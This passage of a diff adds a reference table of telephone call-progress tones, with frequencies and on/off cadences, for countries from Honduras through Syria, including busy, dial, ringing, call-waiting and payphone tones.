+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off 0.3 on
+                                                                       8.0 off)
+Honduras (Republic of)
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	0.25 on 0.25 off
+	Dial tone -	440	continuous
+	Ringing tone -	440	1.0 on 4.0 off
+	Call waiting tone -	440	0.5 on 0.5 off 2.0 on 4.0 off
+
+Hongkong
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Special dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	continuous
+	Ringing tone -	440+480	0.4 on 0.2 off 0.4 on 3.0 off
+	Call waiting tone -	440	3x(0.5 on 0.5 off)
+
+Hungary (Republic of)
+	Busy tone -	425	0.3 on 0.3 off
+	Congestion tone -	425	0.3 on 0.3 off
+	Dial tone -	425	continuous
+	Second dial tone -	425+450	continuous
+	Special dial tone -	350+375+400	continuous
+        Negative indication tone -      300+425 0.2 on 0.2 off 0.2 on 0.2 off
+                                                 0.2 on 0.2 off + announcement
+	Offering tone, trunk -	425	0.3 on 0.3 off 0.3 on 1.5 off
+	Pay tone -	600//1100	(3 or 5)(0.15 on 0.15 off)
+	Positive indication tone -	300+425	1.0 on 0.2 off + announcement
+	Payphone recognition tone -	1100+1750//750+1450	0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	425	1.25 on 3.75 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone -	425	0.3 on 0.3 off 0.3 on 1.5 off
+	Call waiting tone -	425	0.04 on 1.96 off
+
+Channel islands: Guernsey
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.40 on 0.35 off 0.25 on 0.52 off
+	Dial tone -	350+450	continuous
+	Special dial tone -	350+450	0.75 on 0.75 off
+	Pay tone -	400	0.125 on 0.125 off
+	Ringing tone -	400+450	0.4 on 0.2 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	400	8x(0.1 on 4.9 off)
+
+Channel islands: Jersey
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.4 on 0.35 off 0.225 on 0.525 off
+	Dial tone -	350+450	continuous
+	Number unobtainable tone -	400	continuous
+	Pay tone -	400	0.125 on 0.125 off
+	Ringing tone -	400+450	0.4 on 0.2 off 0.4 on 2.0 off
+	Waiting tone -	400	0.1 on 2.5 off 0.1 on
+
+India (Republic of)
+	Acceptance tone -	400	1.0 on 4.0 off
+	Busy tone -	400	0.75 on 0.75 off
+	Congestion tone -	400	0.25 on 0.25 off
+	Dial tone -	400x25	continuous
+	Special dial tone -	400+300	continuous
+	Holding tone -	400	0.25 on 0.25 off 0.25 on 3.25 off
+	Intrusion tone -	400	0.15 on 4.85 off
+	Number unobtainable tone -	400	2.8 on 0.2 off
+	Refusal tone -	400	0.25 on 0.25 off
+	Ringing tone - I	400x25	0.4 on 0.2 off 0.4 on 2..0 off
+	Ringing tone - II	400x25	1.0 on 2.0 off
+	Route tone -	400	0.1 on 0.9 off
+	Call waiting tone -	400	0.2 on 0.1 off 0.2 on 7.5 off
+
+Indonesia (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	4x(0.125 on 0.125 off) + continuous
+	Howler tone -	1400	10.0 on
+	Number unobtainable tone -	425	2.0 on 0.5 off
+	Offering tone, trunk -	425	0.5 on 0.5 off 0.5 on 1.0 off
+	Payphone recognition tone -	1000	5.0 on 5.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x(0.33 on 0.03 off)
+	Call waiting tone -	425	0.15 on 0.15 off 0.15 on 10.0 off
+	Caller waiting tone -	425	1.0 on 4.0 off
+
+Iran (Islamic Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Second dial tone -	400/425	continuous
+	Recall dial tone -	425	continuous
+	Holding tone -	950/950/1400	0.65 on 0.325 off 0.325 on
+                                                    1.3 on 2.6 off
+	Offering tone, trunk -	425	0.15 on 0.25 off 0.15 on 1.45 off
+	Preemption tone -	1400	3x(0.1 on 0.1 off)
+	Permanent signal tone -	1400	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Waiting tone -	425	0.2 on 0.2 off 0.2 on 10.0 off
+
+Iraq (Republic of)
+	Busy tone -	400	1.0 on 1.0 off
+	Recall dial tone -	133	0.4 on 0.2 off 0.4 on 1.5 off
+	Ringing tone -	400	continuous
+
+Ireland
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	400//425//450	continuous
+	Pay tone -	12000	0.12 on
+	Ringing tone -	400+450//425	0.4 on 0.2 off 0.4 on 2.0 off
+	Route tone -	425	0.06 on 0.06 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.18 on 0.20 off 0.20 on 4.50 off
+
+Iceland
+	Busy tone -	425	0.25 on 0.25 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone - (7)	425	0.4 on 0.04 off
+	Number unobtainable tone -	announcement
+	Payphone recognition tone -	1633/1209	0.2 on 0.2 off
+                                                        0.2 on 2.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Warning tone -	425	0.4 on 15.0 off
+	Waiting tone -	425	4x(0.2 on 0.2 off 0.2 on 3.6 off
+                                              0.2 on 0.2 off 0.2
+	on)
+
+Israel (State of)
+	Busy tone -	400	0.5 on 0.5 off
+	Confirmation tone - I	400	1x(0.15 on 0.15 off 0.3 on)
+	Confirmation tone - II	400	0.04 on 0.04 off
+	Dial tone -	400	continuous
+	Second dial tone -	400	3x(0.1 on 0.1 off) + continuous
+	Recall dial tone -	400	3x(0.1 on 0.1 off) + continuous
+	Special dial tone -	400	1.0 on 0.25 off
+	Holding tone -	400	0.05 on 2.0 off
+	Number unobtainable tone -	1000/1400/1800	3x0.333 on 1.0 off
+                                                             +announcement
+        Payphone recognition tone -     1209/852        5x(0.2 on 0.2 off
+                                                            0.2 on 2.0 off)
+	Ringing tone -	400	1.0 on 3.0 off
+	Search tone -	1004	0.01 on 1.0 off
+	Special information tone -	1000/1400/1800	3x0.333 on 1.0 off
+                                                         + announcement
+	Waiting tone - message	400	10x(0.16 on 0.16 off) + continuous
+	Call waiting tone -	400	1x(0.15 on 10.0 off 0.15 on)
+	Caller waiting tone -	400	2x(0.1 on 0.1 off) 0.6 on 3.0 off
+
+Italy
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	0.2 on 0.2 off 0.6 on 1.0 off
+	Special dial tone -	425	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	announcement
+        Call waiting tone - (4) 425   0.40 on 0.10 off 0.25 on 0.10 off 0.15 on
+
+Jamaica
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Call waiting tone -	440	0.25 on 0.25 off
+
+Japan
+	Busy tone - (3)	400	0.5 on 0.5 off
+	Dial tone - I	400	continuous
+	Dial tone - II, pabx	400	0.25 on 0.25 off
+	Dial tone - III	400	0.125 on 0.125 off 0.125 on 0.125 off
+                                                       0.125 on 0.125
+	 off 0.125 on 0.125 off 0.75 on 0.25 off
+	Second dial tone - (3)	440	0.125 on 0.125 off
+	Pay tone -	250	0.5 on
+	Positive indication tone - I	400	0.125 on 0.125 off
+                                                0.125 on 0.625 off
+        Positive indication tone - II   400     0.125 on 0.125 off
+                                                0.625 on 0.125 off
+	Ringing tone - I	400x16	1.0 on 2.0 off
+	Ringing tone - II, pabx	400x20	1.0 on 2.0 off
+        Call waiting tone - I   400x16/400      0.5 on 0.0~4.0 off
+                                              0.05 on 0.45 off 0.05 on 3.45 off
+	 0.05 on 0.45 off 0.05 on 3.45 off
+	Call waiting tone - II	400x16/400	0.1 on 0.1 off 0.1 on 3.0 off
+	Call waiting tone - III	400x16/400	0.064 on 0.436 off
+                                                0.064 on 3.436 off
+        Call waiting tone - IV  400x16/400      0.25 on 0.25 off
+                                                0.25 on 3.25 off
+
+Jordan (Hashemite Kingdom of)
+	Busy tone - I	400	0.75 on 0.75 off
+	Busy tone - II	420x40//440+400	0.5 on 0.5 off
+	Confirmation tone -	400	20x(0.125 on 0.125 off) + continuous
+	Congestion tone - I	420x40	0.5 on 0.5 off
+	Congestion tone - II	400+440	0.25 on 0.25 off
+	Dial tone -	420x40//400+440	continuous
+	Holding tone -	420x40//400+440	0.5 on 0.5 off 0.5 on 0.25 off
+	Number unobtainable tone -	600x120//540+660	2.5 on 0.5 off
+	Ringing tone - I	420x40//440+400	1.2 on 4.8 off
+	Ringing tone - II	400+16 2/3	0.4 on 0.2 off 0.4 on 2.0 off
+	Waiting tone -	420x40//400+440	0.5 on 2x(0.3 off 0.2 on) 3.0 off
+
+Kenya (Republic of)
+	Busy tone -	425	0.2 on 0.6 off 0.2 on 0.6 off
+	Congestion tone -	425	0.2 on 0.6 off
+	Dial tone -	425	continuous
+	Pay tone - I	941	0.2 on 0.2 off
+	Pay tone - II	800/1600	0.08 on 0.08 off
+	Payphone recognition tone -	1633	0.08 on 1.5 off
+	Ringing tone -	425	0.67 on 3.0 off 1.5 on 5.0 off
+	Special information tone -	900/1400/1800	3x0.75 on 1.25 off
+	Warning tone - operator intervening	425	0.2 on 0.2 off
+	Call waiting tone -	425	continuous
+
+Kiribati (Republic of)
+	Busy tone -	425	0.375 on 0.375 off
+	Congestion tone -	425	0.375 on 0.375 off
+	Dial tone -	425	continuous
+	Number unobtainable tone -	425	2.5 on 0.5 off
+	Ringing tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Call waiting tone -	425	0.1 on 0.2 off 0.1 on 4.7 off
+
+Kuwait (State of)
+	Acceptance tone -	425	continuous
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Second dial tone -	425	continuous
+	Special dial tone -	425	0.40 on 0.04 off
+	Line lock-out tone -	425	0.32 on 0.32 off
+	Refusal tone -	425	0.1 on 0.4 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Route tone -	425	0.1 on 0.1 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Warning tone -	425	0.34 on 5.0 off
+	Call waiting tone -	425	1.0 on 4.0 off
+
+Lao People's Democratic Republic
+	Busy tone -	425	1.0 on 1.0 off
+	Confirmation tone -	950	continuous
+	Congestion tone -	425	0.375 on 0.375 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	0.4 on 0.04 off
+	Number unobtainable tone -	425	2.5 on 0.5 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Waiting tone -	425	0.4 on 0.4 off
+Latvia (Republic of)
+	Busy tone -	425	0.3 on 0.3 off
+	Congestion tone -	425	0.15 on 0.15 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.2 on 5.0 off
+
+Lebanon
+	Busy tone -	435	0.4 on 0.2 off
+	Ringing tone -	435	1.2 on 4.4 off
+
+Liberia (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+        Number unobtainable tone -      425   0.6 on 0.2 off 3x(0.2 on 0.2 off)
+	Ringing tone -	 425//450	1.0 on 4.0 off
+
+Lithuania (Republic of)
+	Busy tone -	425	0.4 on 0.4 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	0.8 on 3.2 off
+	Waiting tone -	950/1400/1800	3x0.333 on 1.0 off
+
+Luxembourg
+	Busy tone -	425//2125	0.48 on 0.48 off
+	Congestion tone -	425//2125	0.24 on 0.24 off
+	Dial tone -	425//2125	continuous
+	Special dial tone -	400//425	continuous
+	Ringing tone -	425//2125	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Test number tone -	1000	continuous
+	Call waiting tone -	425	continuous
+
+Macau
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	1.8 on 0.2 off
+	Payphone recognition tone -	1100+1750/750+1450	0.2 on 0.2 off
+                                                                0.2 on 0.2 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Call waiting tone -	425	0.2 on 0.6 off
+
+Madagascar (Republic of)
+	Busy tone -	440//425	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Dial tone -	440//425	continuous
+	Special dial tone -	330+440	continuous
+	Facilities tone -	950	continuous
+	Pay tone -	announcement
+	Ringing tone -	440//425	1.7 on 3.3 off
+	Route tone -	440//425	0.05 on 0.05 off
+	Special information tone -	440	0.40 on 0.04 off
+	Call waiting tone -	440	0.1 on 1.9 off
+
+Malaysia
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone - I	425	0.50 on 0.25 off
+	Congestion tone - II	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Ringing tone - I	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Ringing tone - II	425	1.0 on 3.0 off 1.0 on 5.0 off
+
+Malawi
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Intrusion tone - (4)	1400	0.35 on 0.5 off
+	Payphone recognition tone -	1100+1750/750+1450
+                                        2x(0.2 on 0.2 off)
+	Ringing tone -	425	1.0 on 4.0 off
+	Special ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+
+Maldives (Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.25 on 0.25 off
+	Dial tone -I	400/50	continuous
+	Dial tone -II	400/50	1.0 on 1.0 off + continuous
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400	0.4 on 0.2 off 0.4 on 2.0 off
+	Call waiting tone -	400	1.0 on 10.0 off
+
+Mali (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Dial tone -	425	continuous
+	Pay tone -	announcement
+	Ringing tone -	425	1.5 on 3.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Special information tone -	900/1400/1800	0.35 on 0.30 on
+                                                        0.35 on 1.0 off
+	Call waiting tone -	425	0.3 on 10.0 off
+
+Malta
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	0.2 on 0.2 off 0.6 on 1.0 off
+	Special dial tone -	425	0.4 on 0.04 off
+	Intercept tone -	950/1400/1800	3x0.24 on 1.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	announcement
+	Call waiting tone -	1400	0.34 on 1.5 off
+
+Morocco (Kingdom of)
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+        Second dial tone -      660/440/590/740 0.5 on 0.5 off 0.5 on 0.3 on
+                                                                      0.2 on
+	Ringing tone -	425	1.66 on 3.33 off
+	Route tone -	425	0.05 on 0.05 off
+
+Martinique (French Department of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off
+                                                        0.3 on 8.0 off)
+Mauritius (Republic of)
+	Busy tone -	425	0.75 on 0.75 off
+	Dial tone -	425	continuous	Special dial tone -	425	0.4 on 0.04 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Call waiting tone -	425	1.0 on 3.0 off
+
+Mauritania (Islamic Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.5 on 3.5 off
+	Route tone -	425	0.05 on 0.05 off
+
+Mayotte (Collectivité territoriale de la République française)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off
+                                                        0.3 on 8.0 off)
+Mexico
+	Busy tone -	425	0.25 on 0.25 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Warning tone - operator intervening	425	0.5 on 0.17 off
+                                                        0.17 on 0.17 off
+Moldova (Republic of)
+	Busy tone -	425	0.35 on 0.35 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Pay tone -	1400	3x1.0 on 1.0 off
+	Ringing tone - I	425	0.8 on 3.2 off
+	Ringing tone - II	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Call waiting tone -	425	0.2 on 5.0 off
+
+Montserrat
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	0.25 on 0.25 off
+	Payphone recognition tone -	1600/1143	0.2 on 0.2 off
+                                                        0.2 on 2.0 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+        Warning tone - operator intervening     450     0.2 on 0.2 off 0.65 on
+                                                                       0.2 off
+	Waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+Mozambique (Republic of)
+	Busy tone -	400	0.5 on O.5 off
+	Number unobtainable tone -	400	0.2 on 0.2 off
+	Ringing tone -	400	1.0 on 5.0 off
+
+Namibia (Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.25 on 0.25 off
+	Dial tone -	400x33	continuous
+	Ringing tone -	400x33	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	400x33	continuous
+
+Nauru (Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+	Busy tone - pabx	425	0.375 on 0.375 off
+	Congestion tone - pabx	425	0.375 on 0.375 off
+	Dial tone -	400	continuous
+	Dial tone - pabx	33	continuous
+        Recall dial tone - pabx 33      continuous
+        Number unobtainable tone -      400   0.75 on 0.25 off 0.25 on 0.25 off
+	Ringing tone -	400	1.0 on 4.0 off
+	Ringing tone - pabx	425x25	0.4 on 0.2 off 0.4 on 2.0 off
+
+Nepal
+	Busy tone -	425	0.25 on 0.25 off
+	Congestion tone -	425	0.175 on 0.175 off
+	Dial tone -	425	continuous
+	Number unobtainable tone -	425	0.25 on 0.5 off
+	Ringing tone -	425	1.1 on 3.1 off
+
+Niger (Republic of the)
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Second dial tone -	330//440	continuous
+	Ringing tone -	440	1.7 on 3.3 off
+	Route tone -	440	0.05 on 0.05 off
+
+Nigeria (Federal Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.25 on 0.25 off
+	Dial tone -	400//450	continuous
+	Recall dial tone -	400//425	continuous
+	Special dial tone -	425	0.5 on 0.5 off
+        Holding tone -  950/950/1400  0.65 on 0.325 off 0.325 on 1.3 on 2.6 off
+	Number unobtainable tone -	450	0.5 on 0.5 off
+	Ringing tone -	400//450	2.0 on 4.0 off
+	Special information tone -	400//33	0.2 on 1.5 off
+	Warning tone - operator intervening	400	0.15 on 0.25 off 0.15 on
+                                                                        1.45 off
+	Call waiting tone -	400	0.2 on 0.2 off
+
+Norway
+	Busy tone -	425	0.5 on 0.5 off
+	Confirmation tone -	425	0.4 on
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Special dial tone -	470	0.4 on
+	Intrusion tone -	1400	1x(2.0 on)
+	Pay tone - I	1477+941	0.2 on 2.0 off 0.2 on 2.0 off
+	Pay tone - II	1633+1336	0.2 on 0.2 off 0.2 on 4.0 off
+	Payphone recognition tone -	1477/941	4x(0.2 on 0.2 off
+                                                           0.2 on 2.0 off)
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	425	1x(1.0 on 0~4.0 off)
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - I	1400	0.4 on 15.0 off
+	Warning tone - II	1400	1x(0.4 on 0~15.0 off)
+	Call waiting tone -	425	0.2 on 0.6 off 0.2 on 1.0 off
+
+New Caledonia (Territoire français d'outre-mer)
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	1.7 on 3.3 off + announcement
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.7 on 3.3 off
+	Special information tone -	440	1.7 on 3.3 off + announcement
+	Call waiting tone -	440	4x(0.5 on 0.5 off 0.5 on)
+
+New Zealand
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone - I	900	0.5 on 0.5 off
+	Congestion tone - II	400	0.25 on 0.25 off
+	Dial tone - (3)	400	continuous
+	Function acknowledge tone -	440+450	2.0 on 0.4 off 0.2 on 0.4 off
+	Holding tone -	400/400+450	0.5 on 0.5 off 0.5 on 0.25 off
+	Number unobtainable tone -	400	3x(0.75 on 0.1 off) 0.75 on
+                                                                    0.4 off
+        Payphone recognition tone -     1100+1750/750+1450      0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+	Ringing tone -	400+450	0.4 on 0.2 off 0.4 on 2.0 off
+	Waiting tone - I	400+450	0.5 on
+	Waiting tone - II	400	0.25 on 0.25 off 0.25 on 3.25 off
+	Waiting tone - III	523/659	3x(0.2 on 3.0 off) 0.2 on
+
+Oman (Sultanate of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Intrusion tone -	425	0.5 on 0.17 off 0.17 on 0.17 off
+	Ringing tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.3 on 1.0 off
+
+Uganda (Republic of)
+	Busy tone -	425	0.5 on 5.0 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone -	350/440	continuous
+	Howler tone -	1400	continuous
+	Number unobtainable tone -	950/1400/1800	3x0.33 on 1.00 off
+	Offering tone, trunk -	425	0.1 on 4.9 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Call waiting tone -	425	continuous
+
+Pakistan (Islamic Republic of)
+	Busy tone - I	400	0.75 on 0.75 off
+	Busy tone - II	450	0.4 on 0.675 off 0.13 on 0.17 off
+	Ringing tone - I	450	1.0 on 4.0 off
+	Ringing tone - II	400+16 2/3	0.4 on 0.2 off 0.4 on 2.0 off
+
+Panama (Republic of)
+	Busy tone -	425	0.32 on 0.32 off
+	Congestion tone -	425	0.32 on 0.32 off
+	Dial tone -	425	continuous
+	Number unobtainable tone -	425	0.18 on 0.18 off 0.5 on 0.18 off
+	Ringing tone -	425	1.2 on 4.65 off
+	Special information tone -	425	0.4 on 0.4 off
+	Warning tone - operator intervening	425	0.18 on 0.18 off
+                                                        0.5 on 0.18 off
+	Call waiting tone -	425	0.18 on 0.18 off 0.18 on
+
+Papua New Guinea
+	Busy tone -	425//400	0.375 on 0.375 off
+	Congestion tone -	425//400	0.375 on 0.375 off
+	Dial tone -	425//400x25//350+440	continuous
+	Special dial tone -	425	0.4 on 0.04 off
+	Number unobtainable tone -	425//400	2.5 on 0.5 off
+        Payphone recognition tone - I   1209/852        4x(0.2 on 0.2 off
+                                                           0.2 on 2.0 off)
+	Payphone recognition tone - II	1336/941	2x(0.2 on 0.2 off
+                                                           0.2 on 2.0 off)
+        Payphone recognition tone - III 900     2x(0.075 on 0.15 off 0.075 on
+                                                                  2.7 off)
+	Ringing tone -	425//400x25//400x16 	0.4 on 0.2 off 0.4 on 2.0 off
+	2/3//400+450//410x20
+	Special information tone -	950/1400/1800	3x0.33 on 1.01 off
+	Warning tone - operator intervening	1400	0.5 on 11.5 off
+	Waiting tone -	425	0.04 on 10.0 off 0.04 on 20.0 off 0.04 on
+                                                                20.0 off
+
+Paraguay (Republic of)
+	Busy tone -	425	1.0 on 1.0 off
+	Number unobtainable tone -	425	2.0 on 0.5 off
+	Positive indication tone -	950/1400/1800	3x0.333 on 1.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+        Warning tone - operator intervening     425     0.15 on 0.25 off
+                                                        0.15 on 1.45 off
+	Waiting tone -	950/950/1400	0.65 on 0.325 off 0.125 on
+                                                        1.3 off 2.6 on
+
+Netherlands (Kingdom of the)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	0.5 on 0.05 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Waiting tone -	425	0.5 on 9.5 off
+
+Peru
+	Acceptance tone -	announcement
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off 0.2 on 0.2 off
+                                                       0.2 on 0.6 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	1.0 on 0.1 off
+	Howler tone -	1500+3200	0.5 on
+	Number unobtainable tone -	announcement
+	Refusal tone -	announcement
+	Ringing tone -	425	0.15 on 0.30 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.175 on 0.175 off 0.175 on 3.5 off
+
+Philippines (Republic of the)
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Conference tone -	440	0.2 on 15.0 off
+	Dial tone -	425	continuous
+	Special dial tone -	400+25	continuous
+        Holding tone -  950/950/1400  0.65 on 0.325 off 0.325 on 1.3 on 2.0 off
+	Howler tone -	1400+1800	0.2 on 0.3 off
+	Number unobtainable tone -	600x120	0.25 on 0.25 off
+	Ringing tone -	425+480	1.0 on 4.0 off
+	Call waiting tone -	440	0.3 on 10.0 off
+
+Poland (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Second dial tone -	425+350	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Waiting tone -	425	0.15 on 0.15 off 0.15 on 4.0 off
+
+French Polynesia (Territoire français d'outre-mer)
+	Acceptance tone -	440	1.7 on 3.3 off
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Second dial tone -	440+330	continuous
+	Howler tone -	3000	continuous
+	Pay tone -	440	continuous
+	Ringing tone -	440	1.7 on 3.3 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	440	1.7 on 3.3 off
+
+Portugal
+	Acceptance tone -	425	1.0 on 0.2 off
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	1.0 on 0.2 off
+	Number unobtainable tone -	425	0.2 on 0.2 off
+	Pay tone - I	250	0.5 on
+	Pay tone - II	770	0.5 on
+	Pay tone - III	985	1.0 on 1.0 off
+	Pay tone - IV	941	0.2 on 0.2 off
+	Pay tone - V	697	1.0 on
+        Payphone recognition tone - I   1477/941  0.2 on 0.2 off 0.2 on 2.0 off
+        Payphone recognition tone - II  1633/1209 0.2 on 0.2 off 0.2 on 2.0 off
+	Payphone recognition tone - III	25+50	1.0 on 4.0 off
+	Refusal tone -	450/1400/1800	3x0.33 on 1.0 off
+	Ringing tone -	425	1.0 on 5.0 off
+	Special ringing tone -	425	2x(1.0 on 5.0 off)
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	425	3x(0.2 on 1.4 off)
+	Call waiting tone -	425	0.2 on 0.2 off 0.2 on 5.0 off
+
+Puerto Rico
+        Payphone recognition tone -     1100+1750/750+1450      0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+Qatar (State of)
+	Acceptance tone -	400+450	0.38 on 0.25 off 0.38 on 2.00 off
+	Busy tone - I	400+450	0.8 on 0.8 off
+	Busy tone - II	400	0.375 on 0.375 off
+	Busy tone - III	400	0.5 on 0.5 off
+	Congestion tone -	400	0.40 on 0.35 off 0.22 on 0.52 off
+	Dial tone -	350+440	continuous
+	Line lock-out tone -	400	0.32 on 0.32 off
+	Number unobtainable tone -	400	continuous
+	Refusal tone -	400	continuous
+	Ringing tone - I	400+450	0.38 on 0.25 off 0.38 on 2.0 off
+	Ringing tone - II	400+450	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone -	330+440	1.0 on 1.0 off
+	Call waiting tone -	400	0.3 on 10.0 off
+
+Syrian Arab Republic
+	Busy tone -	450	0.5 on 0.5 off
+	Congestion tone -	450	0.25 on 0.25 off
+	Dial tone -	450	continuous
+	Ringing tone -	400//450	1.0 on 0.5 off
